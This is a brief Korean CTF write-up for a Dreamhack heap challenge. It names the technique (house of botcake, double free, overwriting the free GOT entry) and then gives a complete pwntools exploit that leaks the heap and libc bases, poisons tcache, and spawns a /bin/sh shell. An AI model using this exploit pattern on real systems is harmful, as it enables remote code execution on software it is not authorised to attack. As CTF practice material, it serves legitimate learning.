house_of_botcake -> free got overwrite
free 할 때 bitmap 검증을 안 해서 쉽게 `DFB`를 유발할 수 있다.
하지만 `botcake`도 쉬워서 푸는 시간은 비슷하다.

# ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'b *0x401aa4',
    'c'
]

binary = './main'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("host3.dreamhack.games", 22857)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))

l = ELF('./libc.so.6')
e = ELF('./main')

def create(idx : int):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(idx).encode())

def read(idx : int):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    return p.recvline()

def edit(idx : int, ctt : bytes):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

def delete(idx : int):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

def create2(idx : int):
    p.sendlineafter(b': ', b'5')
    p.sendlineafter(b': ', str(idx).encode())

def read2(idx : int):
    p.sendlineafter(b': ', b'6')
    p.sendlineafter(b': ', str(idx).encode())
    return p.recvline()

def edit2(idx : int, ctt : bytes):
    p.sendlineafter(b': ', b'7')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

for i in range(10):
    create(i)
for i in range(7):
    delete(i)
delete(8)
delete(7)
heap_base = u64(read(0).split(b': ')[1][:8]) << 12
l.address = u64(read(7).split(b': ')[1][:8]) - 0x21ace0
print(hex(heap_base))
print(hex(l.address))

create(6)
delete(8)
create2(0)
edit2(0, b'a' * 0x98 + p64(0xa1) + p64((e.got['free'] - 8) ^ (heap_base >> 12)))
create(10)
create(11)
edit(11, b'a' * 8 + p64(l.sym['system']))
edit(10, b'/bin/sh\x00')
delete(10)
p.interactive()
```